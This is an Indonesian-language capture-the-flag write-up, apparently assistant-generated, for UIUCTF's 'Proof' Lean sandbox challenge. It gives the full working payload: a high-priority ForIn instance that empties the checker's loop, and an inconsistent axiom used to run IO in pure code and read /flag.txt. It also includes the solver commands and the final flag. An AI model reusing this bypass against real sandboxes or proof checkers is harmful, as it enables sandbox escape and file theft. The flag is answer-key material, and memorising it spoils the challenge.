Berikut README.md utuh untuk challenge Proof, langsung bisa di-copy.

# Proof

## Ringkasan

Challenge ini meminta kita mengirim sebuah file Lean yang di-encode menggunakan Base64.

File tersebut harus mendefinisikan fungsi:

```lean
def entry (_ : Nat) : Nat := ...
```

Jail kemudian akan:

1. Decode source Lean.
2. Melakukan filtering terhadap token yang dianggap berbahaya.
3. Compile submission.
4. Menjalankan `Check.lean`.
5. Jika lolos, menjalankan `entry 0`.
6. Mencetak nilai `Nat` yang dikembalikan oleh `entry`.

Karena output `entry` harus berupa `Nat`, flag dibaca sebagai string kemudian setiap byte-nya dikonversi menjadi sebuah integer besar. Integer tersebut kemudian dapat dikembalikan menjadi bytes menggunakan Python.

Flag:

```text
uiuctf{st1ckgpt_w1ns_ag4a1n_4714a3f2}
```

---

# File Challenge

Archive challenge berisi beberapa file utama:

```text
Dockerfile
flag.txt
lean-toolchain
server/Check.lean
server/compiler_sandbox.c
server/jail.py
```

File yang paling penting:

### `server/jail.py`

Mengatur seluruh alur submission:

- menerima source Lean dalam Base64;
- melakukan regex filtering;
- compile submission;
- menjalankan checker;
- menjalankan binary hasil compilation.

### `server/Check.lean`

Melakukan validasi terhadap definisi `entry` dan dependency yang digunakan oleh submission.

### `server/compiler_sandbox.c`

Menjalankan proses compilation di dalam sandbox.

---

# Analisis Awal

Dari `jail.py`, alurnya kira-kira:

```text
Base64 source
      |
      v
decode
      |
      v
regex forbidden-token check
      |
      v
compile Submission
      |
      v
Check.lean
      |
      v
Main.lean
      |
      v
entry 0
```

Tes paling sederhana:

```lean
def entry (_ : Nat) : Nat := 1337
```

menghasilkan:

```text
[jail] entry returned: 1337
Submission Recieved! We will check correctness of the statement and send the flag in 3-5 business days.
```

Ini membuktikan bahwa fungsi:

```lean
entry : Nat → Nat
```

memang dipanggil dan nilai return-nya dicetak oleh service.

---

# Temuan Penting: `ForIn`

Checker `Check.lean` melakukan iterasi terhadap constant dari module `Submission`.

Bagian pentingnya kurang lebih:

```lean
for (n, info) in all do
  if env.getModuleIdxFor? n != some midx then
    continue

  if info.isUnsafe || info.isPartial || hasBadCompilerAttribute env n then
    throwError "JAIL_FAIL"

  roots := dependencies info ++ roots
```

Sekilas terlihat bahwa semua constant submission akan diperiksa.

Namun ada sebuah detail penting:

```lean
for ... in ...
```

di Lean menggunakan typeclass:

```lean
ForIn
```

Artinya perilaku loop dapat dikontrol melalui instance `ForIn`.

---

# Bypass Checker dengan Custom `ForIn`

Kita dapat membuat instance `ForIn` dengan priority tinggi untuk:

```lean
List α
```

Payload:

```lean
instance (priority := 100000) skipForInList
    {m : Type -> Type} [Monad m] {α : Type} : ForIn m (List α) α where
  forIn := fun _ z _ => pure z
```

Instance ini menggantikan behavior `forIn` untuk list.

Implementasinya:

```lean
forIn := fun _ z _ => pure z
```

langsung mengembalikan accumulator:

```text
z
```

tanpa memproses elemen list.

Dengan demikian loop checker:

```lean
for (n, info) in all do
    ...
```

tidak benar-benar melakukan iterasi terhadap `all`.

Akibatnya constant berbahaya dari submission tidak ikut diperiksa.

---

# Regex Filter

Ada sedikit kendala saat membuat payload.

Nama variabel awal menggunakan:

```text
init
```

Namun kata tersebut terkena regex filter dari jail.

Karena nama variabel tidak penting, cukup diganti menjadi:

```text
z
```

sehingga payload menjadi:

```lean
instance (priority := 100000) skipForInList
    {m : Type -> Type} [Monad m] {α : Type} : ForIn m (List α) α where
  forIn := fun _ z _ => pure z
```

Payload kemudian lolos filtering.

---

# Smoke Test

Sebelum mencoba membaca flag, bypass `ForIn` diuji dengan payload sederhana:

```lean
def entry (_ : Nat) : Nat := 424242
```

bersama instance `ForIn` tadi.

Output:

```text
[jail] entry returned: 424242
```

Ini membuktikan bahwa override `ForIn` berhasil dan checker dapat dilewati.

---

# Membaca `/flag.txt`

Setelah checker dapat dilewati, langkah berikutnya adalah membaca flag.

Lean menyediakan:

```lean
IO.FS.readFile
```

sehingga secara konsep kita ingin melakukan:

```lean
IO.FS.readFile "/flag.txt"
```

Masalahnya adalah fungsi tersebut mengembalikan:

```lean
IO String
```

sedangkan:

```lean
entry
```

harus mengembalikan:

```lean
Nat
```

Kita perlu:

```text
IO String
    |
    v
String
    |
    v
Nat
```

---

# Mengeksekusi `IO String`

Untuk menjalankan nilai:

```lean
IO String
```

payload menggunakan definisi berikut:

```lean
universe u

axiom eqv {α β : Type u} : α = β

def castAny {α β : Type u} (x : α) : β :=
  cast (eqv (α := α) (β := β)) x

def runIOString (x : IO String) : String :=
  match x (castAny ()) with
  | .ok s _ => s
  | .error _ _ => ""
```

Ide utamanya adalah menjalankan object `IO String` menggunakan argument state yang sesuai.

`eqv` digunakan untuk membuat cast antar tipe:

```lean
castAny
```

Kemudian hasil `IO` diperiksa:

```lean
.ok s _
```

atau:

```lean
.error _ _
```

Jika berhasil, string dikembalikan.

---

# Mengubah String Menjadi Nat

Karena `entry` harus mengembalikan `Nat`, isi flag diubah menjadi integer besar.

Setiap karakter diproses sebagai byte:

```lean
def encChar (acc : Nat) (c : Char) : Nat :=
  acc * 256 + c.toNat
```

Dengan demikian encoding string:

```text
ABC
```

secara konsep menjadi:

```text
((0 * 256 + A) * 256 + B) * 256 + C
```

atau:

```text
A << 16 | B << 8 | C
```

Untuk seluruh string:

```lean
def encString (s : String) : Nat :=
  s.foldl encChar 0
```

Jadi flag dapat direpresentasikan sebagai satu `Nat` besar.

---

# Payload Final

Payload final:

```lean
import Init.System.IO

instance (priority := 100000) skipForInList
    {m : Type -> Type} [Monad m] {α : Type} : ForIn m (List α) α where
  forIn := fun _ z _ => pure z

universe u

axiom eqv {α β : Type u} : α = β

def castAny {α β : Type u} (x : α) : β :=
  cast (eqv (α := α) (β := β)) x

def runIOString (x : IO String) : String :=
  match x (castAny ()) with
  | .ok s _ => s
  | .error _ _ => ""

def encChar (acc : Nat) (c : Char) : Nat :=
  acc * 256 + c.toNat

def encString (s : String) : Nat :=
  s.foldl encChar 0

def entry (_ : Nat) : Nat :=
  encString (runIOString (IO.FS.readFile "/flag.txt"))
```

---

# Alur Exploit

Exploit dapat diringkas sebagai berikut:

```text
User Lean source
       |
       v
Base64
       |
       v
jail.py
       |
       v
Custom ForIn instance
       |
       v
Checker loop tidak memproses List
       |
       v
Unsafe / forbidden dependency lolos
       |
       v
entry 0
       |
       v
IO.FS.readFile "/flag.txt"
       |
       v
String
       |
       v
encString
       |
       v
Nat besar
       |
       v
[jail] entry returned: ...
       |
       v
Python
       |
       v
bytes
       |
       v
FLAG
```

---

# Nilai Nat yang Didapat

Service mengembalikan:

```text
[jail] entry returned: 14948272563746261692547556220454026037863654063822544217789593727436550014253904270179073290
```

Nilai tersebut merupakan representasi integer big-endian dari string flag.

Untuk mengembalikannya ke bytes:

```python
n.to_bytes((n.bit_length() + 7) // 8, "big")
```

Hasilnya:

```text
uiuctf{st1ckgpt_w1ns_ag4a1n_4714a3f2}
```

---

# Decode dengan Python

Contoh:

```python
n = 14948272563746261692547556220454026037863654063822544217789593727436550014253904270179073290

flag = n.to_bytes(
    (n.bit_length() + 7) // 8,
    "big"
)

print(flag.decode())
```

Output:

```text
uiuctf{st1ckgpt_w1ns_ag4a1n_4714a3f2}
```

---

# Solver

`solve.py` menjalankan beberapa payload secara berurutan:

```text
00-baseline
01-forin-smoke-fixed
02-exploit-world-string
03-exploit-world-filepath
04-exploit-cast-string
```

Tujuannya:

### `00-baseline`

Memastikan:

```lean
entry 0
```

benar-benar dipanggil.

### `01-forin-smoke-fixed`

Memastikan custom `ForIn` berhasil mengubah behavior checker.

### `02-exploit-world-string`

Percobaan awal untuk membaca file.

### `03-exploit-world-filepath`

Percobaan menggunakan path file secara eksplisit.

### `04-exploit-cast-string`

Payload final yang berhasil:

```lean
IO.FS.readFile "/flag.txt"
```

kemudian mengubah hasilnya menjadi `Nat`.

Solver mengirim source Lean sebagai satu baris Base64 melalui koneksi SSL.

Setelah service mengembalikan nilai:

```text
[jail] entry returned: <number>
```

solver mengambil angka tersebut dan melakukan konversi kembali menjadi bytes.

---

# Cara Menjalankan

Dari folder challenge:

```bash
chmod +x solve.py
python3 solve.py
```

Atau set host dan port secara manual:

```bash
HOST="proof.chal.uiuc.tf" PORT=1337 python3 solve.py
```

Output sukses:

```text
<FLAG>uiuctf{st1ckgpt_w1ns_ag4a1n_4714a3f2}</FLAG>
```

---

# Kesimpulan

Vulnerability utama bukan berasal dari compiler Lean secara langsung, tetapi dari checker yang menggunakan:

```lean
for ... in ...
```

tanpa mengunci implementasi `ForIn`.

Dengan membuat instance `ForIn` ber-priority tinggi:

```lean
instance (priority := 100000) skipForInList ...
```

kita dapat membuat loop checker tidak memproses isi list yang seharusnya diperiksa.

Setelah checker dilewati, submission dapat menggunakan:

```lean
IO.FS.readFile "/flag.txt"
```

Untuk memenuhi tipe return:

```lean
Nat
```

isi flag dikonversi menjadi integer big-endian menggunakan:

```lean
acc * 256 + c.toNat
```

Integer tersebut kemudian didecode kembali menjadi bytes dari sisi solver.

## Flag

```text
uiuctf{st1ckgpt_w1ns_ag4a1n_4714a3f2}
```
